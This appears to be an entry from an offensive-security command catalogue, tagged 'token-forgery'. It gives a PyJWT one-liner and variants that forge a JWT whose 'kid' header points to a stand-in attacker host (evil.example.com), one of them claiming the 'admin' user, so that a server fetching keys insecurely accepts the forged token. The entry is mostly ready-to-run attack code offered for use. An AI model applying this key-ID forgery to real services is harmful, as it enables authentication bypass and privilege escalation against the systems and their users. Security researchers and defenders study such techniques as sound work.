---
type: command
executor: python
data: >-
  jwt.encode({"some": "payload"}, "secret", algorithm="HS256", headers={"kid":
  "http://evil.example.com/custom.key"})
tags:
  - jwt
  - token-forgery
platforms:
  - Linux
  - macOS
  - Windows
verified: true
validated: true
---

# encode-jwt-with-malicious-kid-header

## Command

```python
jwt.encode({"some": "payload"}, "secret", algorithm="HS256", headers={"kid": "http://evil.example.com/custom.key"})
```

## Description

This Python command uses the PyJWT library to encode a JWT with a custom 'kid' header pointing to a malicious external key, enabling forgery if the server resolves it insecurely.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| payload | Dictionary of claims (e.g., {"some": "payload"}) | Yes |
| secret | Signing key/secret | Yes |
| algorithm | Signing algorithm (e.g., "HS256") | Yes |
| headers | Dictionary including 'kid' for key ID | Yes |

## Examples

### Basic Usage

```python
jwt.encode({"user": "admin"}, "mysecret", algorithm="HS256", headers={"kid": "http://evil.example.com/custom.key"})
```

### Advanced Usage

```python
import jwt
encoded = jwt.encode({"exp": 1234567890, "iat": 1234567890}, "secret", algorithm="HS256", headers={"kid": "malicious.key", "typ": "JWT"})
print(encoded)
```

## Expected Output

A base64url-encoded JWT string, e.g., 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imh0dHA6Ly9ldmlsLmV4YW1wbGUuY29tL2N1c3RvbS5rZXkifQ.eyJzb21lIjoicGF5bG9hZCJ9.signature'.

## Related

- [[procedures/JWT-Key-ID-kid-Claim-Misuse]]
